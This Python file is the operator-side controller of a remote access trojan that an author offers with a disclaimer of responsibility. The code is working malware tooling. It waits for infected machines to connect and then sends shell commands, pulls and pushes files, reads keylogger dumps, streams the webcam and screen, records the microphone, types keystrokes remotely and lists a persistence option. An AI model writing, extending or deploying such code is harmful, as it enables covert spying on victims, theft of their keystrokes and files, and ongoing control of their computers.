# Python RAT project by average-joe44
# Does NOT Responsible for any use case!

import socket
import json
import os
import struct
import pickle
import cv2
import wave
import pyaudio
import threading
import time
from fileattacker import download_file, upload_file
from termcolor import cprint

def main_con():
    soc = None
    try:
        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        soc.bind(('0.0.0.0', 9999))
        soc.listen(1)
        cprint('[*] Waiting for connection', 'blue')

        while True:
            conn, addr = soc.accept()
            cprint(f'[+] Connected {addr}', 'green')

            try:
                shellc(conn)
            except Exception as e:
                print(f'{e}')
            finally:
                conn.close()
    except KeyboardInterrupt:
        exit('[-] exiting listener')
    except Exception as e:
        print(f'{e}')
    finally:
        if soc:
            soc.close()

main_log = threading.Event()

def cd(_target):
    try:
        _target.settimeout(5.0)
        print(_target.recv(1024).decode())
        _target.settimeout(None)
    except:
        cprint("[!] Can't receive the canged directory name", 'yellow')

def start_log():
    cprint("[*] Starting logger", 'blue')
    time.sleep(0.5)
    cprint("[+] Logger started", 'green')

    main_log.set()

def baca_log(sok):
    if not main_log.is_set():
        cprint("[-] error, the main function is not running > start_log", 'red')
        return
    
    print("\n")
    recv_keylog(sok)
    print("\n")

def stop_log():
    if not main_log.is_set():
        cprint("[-] error, the main function is not running > start_log", 'red')
        return

    cprint("[*] Stopping logger", 'blue')
    time.sleep(0.5)
    cprint("[+] Logger stopped", 'green')

    main_log.clear()

def recv_keylog(_target):
    try:
        _target.settimeout(10.0)
        cprint("[+] Dumping logs:", 'yellow')
        raw_data = _target.recv(1024)

        if not raw_data:
            cprint('[-] Connection closed', 'red')
            return None
        data = raw_data.decode()
        _target.settimeout(None)
        print(data)
    
    except socket.timeout:
        cprint("[-] No dump received, continuing", 'red')
        return None
    except OSError as e:
        cprint(f'[error] {e}', 'red')
        return None

def start_image_server(host="0.0.0.0", port=9993, save_as="hasil.jpg"):
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.settimeout(23)
        server.bind((host, port))
        server.listen(1)

        cprint("[*] Connecting", 'blue')
        conn, addr = server.accept()
        cprint(f"[+] Connected {addr}", 'green')

        size_data = conn.recv(4)
        size = struct.unpack("!I", size_data)[0]

        data = b""
        while len(data) < size:
            packet = conn.recv(4096)
            if not packet:
                break
            data += packet

        with open(save_as, "wb") as f:
            f.write(data)

        cprint(f'[+] saved as {save_as}', 'yellow')

        conn.close()
        server.close()
    except socket.timeout:
        cprint("[-] Can't access camera", 'red')


def keystroke():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('0.0.0.0', 9995))
        s.listen(1)
        cprint('[*] Connecting', 'blue')
        conn, addr= s.accept()
        with conn:
            cprint(f'[+] Connected {addr}', 'green')
            while True:
                    command = input('text: ')
                    conn.sendall(command.encode())
                    break
    cprint('[+] Sent', 'yellow')

FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100
CHUNK = 1024

def receive_and_save(WAVE_OUTPUT):
    frames = []
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(('0.0.0.0', 9996))
            s.listen(1)
            cprint('[*] Connecting', 'blue')
            conn, addr = s.accept()
            with conn:
                    cprint(f'[+] Connected {addr}', 'green')
                    while True:
                        data = conn.recv(CHUNK)
                        if not data:
                            break
                        frames.append(data)
        cprint('[*] saving WAV file', 'yellow')
        with wave.open(WAVE_OUTPUT, 'wb') as wf:
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(2)
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
        print(f'[+] saved as: {WAVE_OUTPUT}')
    except socket.error as e:
        cprint(f'{e}', 'red')

def screen_record(host="0.0.0.0", port=9999):
    MAX_WIDTH = 960
    MAX_HEIGHT = 540
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(1)

    cprint("[*] Connecting", 'blue')
    conn, addr = server.accept()
    cprint(f"[+] Connected {addr}", 'green') 

    data = b""
    payload_size = struct.calcsize("Q")

    cv2.namedWindow('Screen Share | Q / ESC = Quit', cv2.WINDOW_NORMAL)
    cv2.resizeWindow('Screen Share | Q / ESC = Quit', MAX_WIDTH, MAX_HEIGHT)

    while True:
        try:
            while len(data) < payload_size:
                packet = conn.recv(4096)
                if not packet:
                    return 
                data += packet

            packed_size = data[:payload_size]
            data = data[payload_size:]
            frame_size = struct.unpack("Q", packed_size)[0]

            while len(data) < frame_size:
                data += conn.recv(4096)

            frame_data = data[:frame_size]
            data = data[frame_size:]

            frame = pickle.loads(frame_data)
            frame = cv2.resize(frame, (MAX_WIDTH, MAX_HEIGHT))
            
            cv2.imshow("Screen Share | Q / ESC = Quit", frame)

            key = cv2.waitKey(1) & 0xFF
            if key == ord('q') or key == 27:
                cprint("[!] Stopped", 'yellow')
                break

        except Exception as e:
            cprint(f'[error] {e}', 'red')
            break

    conn.close()
    cv2.destroyAllWindows()


def konversi_byte_stream():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('0.0.0.0', 9998))
    sock.listen(1)
    cprint('[*] Connecting', 'blue')
    konek = sock.accept()
    tg = konek[0]
    ip = konek[1]
    cprint(f'[+] Connected {ip}', 'green')
    bdata = b""
    payload_size = struct.calcsize("Q")
    try:
        while True:
                while(len(bdata)) < payload_size:
                    packet = tg.recv(4*1024)
                    if not packet: break
                    bdata += packet
                packed_msg_size = bdata[:payload_size]
                bdata = bdata[payload_size:]
                msg_size = struct.unpack("Q", packed_msg_size)[0]
                while len(bdata) < msg_size:
                    bdata += tg.recv(4*1024)
                frame_data = bdata[:msg_size]
                bdata =  bdata[msg_size:]
                frame = pickle.loads(frame_data)
                cv2.startWindowThread()
                cv2.imshow("streaming / press Q to quit", frame)
                key = cv2.waitKey(1)
                if key & 0xFF == ord('q'):
                    cprint('[!] Stopped', 'yellow')
                    break 
        tg.close()
        cv2.destroyAllWindows()
    except:
        cprint("[-] Can't access camera", 'red')

def data_diterima(_target):
        data = ''
        while True:
            try:
                data = data + _target.recv(1024).decode().rstrip()
                return json.loads(data)
            except ValueError:
                 continue
            except socket.timeout:
                 continue

def shellc(_target):
    x = 0                      
    n = 0
    p = 0
    cprint("[!] Type 'help' for help", 'yellow')
    cprint("[!] Use 'exit' to fully exit both server and client", 'yellow')
    cprint("[!] Use 'bg' or 'background' to background the current shell", 'yellow')
    while True:
        try:
            perintah = input('shell>> ')
            data = json.dumps(perintah)
            _target.send(data.encode())
            if perintah in('exit','quit'):
                cprint('[!] Exiting', 'yellow')
                exit()
            elif perintah in ('background', 'bg'):
                cprint('[+] Backgrounding the session...', 'green')
                exit()
            elif perintah == 'clear':
                os.system('cls')
            elif perintah[:3] == 'cd ':
                cd(_target)
            elif perintah[:8] == 'download':
                download_file(_target, perintah[9:])
            elif perintah[:6] == 'upload':
                upload_file(_target, perintah[7:])
            elif perintah == 'start_log':
                start_log()
            elif perintah == 'baca_log':
                baca_log(_target)
            elif perintah == 'stop_log':
                stop_log()
            elif perintah == 'start_cam':
                konversi_byte_stream()
            elif perintah ==  'screen_shot':
                n += 1
                download_file(_target,"ss"+str(n)+".png")
            elif perintah == 'screen_share':
                screen_record(host='0.0.0.0', port=9991) 
            elif perintah == 'help':
                cprint("""
                        basic command:
                    ================================
                    -exit/quit >> exit the process

                    -background >> background the process
                    
                    -clear     >> clear terminal
                    ================================

                        file transfer command:
                    ================================
                    -download <filename>  >> download file

                    -upload   <filename>  >> upload file
                    ================================

                        keylogging:
                    ================================
                    -start_log >> start keylogger

                    -baca_log  >> read keylogger

                    -stop_log  >> stop keylogger
                    ================================

                        camera command:
                    ================================                   
                    -start_cam >> access camera

                    -snap_cam  >> snap camera
                    ================================

                        screen command:
                    ================================
                    -screen_shot >> screen shot

                    -screen_share >> screen sharing
                    ================================

                        maintain access:
                    ================================ 
                    -persistence >> run persistence
                    example:    persistence winsec manager.exe
                    =================================

                        mic, keys command:
                    ================================
                    -rec_audio >> record audio for 20 second
                    
                    -send_key  >> type keyboard remotely
                    ================================ 

                        execution:
                    ================================
                    -execute    >> start program

                    -kill       >> kill program by image name
                      
                    -pidkill    >> kill program by pid name
                    ================================
                    """, 'yellow')
            elif perintah == 'rec_audio':
                p += 1
                receive_and_save('retrieved_audio'+str(p)+'.wav')
            elif perintah == 'send_key':
                keystroke()   
            elif perintah == 'snap_cam':
                x += 1
                start_image_server(save_as='webcam'+str(x)+'.jpg') 
            elif perintah[:7] == 'execute':
                pass  
            elif perintah[:4] == 'kill':
                pass  
            elif perintah[:7] == 'pidkill':
                pass
            else:
                hasil = data_diterima(_target)
                print(hasil)
        except Exception as e:
            print(f"[error] {e}")

main_con()
